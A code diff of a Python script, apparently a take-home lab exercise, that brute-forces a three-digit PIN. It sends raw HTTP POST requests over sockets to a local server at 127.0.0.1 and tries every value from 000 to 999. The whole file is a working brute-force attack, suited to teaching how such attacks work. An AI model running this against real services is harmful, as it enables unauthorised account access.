@@ -1,35 +1,41 @@
-# bruteforce.py
-# IT6 Take Home Drill
-# Goal: Brute-force a 3-digit PIN using raw sockets only
-
 import socket
 
 HOST = '127.0.0.1'
-PORT = 8888  # Replace with actual port
+PORT = 8888  # might be diff on ur machine
 
-# We'll try a basic POST request with a test PIN ("000")
-test_pin = "000"
-body = f"pin={test_pin}"
+# trying all 3digit pins
+for i in range(1000):
+    guess = str(i).zfill(3)  # ex: '007', '123'
+    data = f"pin={guess}"
 
-# Craft the raw HTTP request manually
-request = (
-    f"POST / HTTP/1.1\r\n"
-    f"Host: {HOST}:{PORT}\r\n"
-    f"Content-Type: application/x-www-form-urlencoded\r\n"
-    f"Content-Length: {len(body)}\r\n"
-    f"Connection: close\r\n"
-    f"\r\n"
-    f"{body}"
-)
+    # manual http post request (raw)
+    req = (
+        "POST / HTTP/1.1\r\n"
+        f"Host: {HOST}:{PORT}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: {len(data)}\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        f"{data}"
+    )
 
-# Try sending it
-try:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        s.sendall(request.encode())
-        response = s.recv(4096).decode()
-        print("[✓] Request sent")
-        print("Response:")
-        print(response)
-except ConnectionRefusedError:
-    print(f"[!] Failed to connect to {HOST}:{PORT}")
+    try:
+        sock = socket.socket()
+        sock.connect((HOST, PORT))
+        sock.send(req.encode())
+
+        result = b""
+        while True:
+            chunk = sock.recv(1024)
+            if not chunk:
+                break
+            result += chunk
+
+        output = result.decode(errors="ignore")
+
+        print(f"Trying [{guess}] --> {output.splitlines()[0]}")
+        sock.close()
+
+    except Exception as err:
+        print(f"[!] Error on pin {guess}: {err}")
+        continue
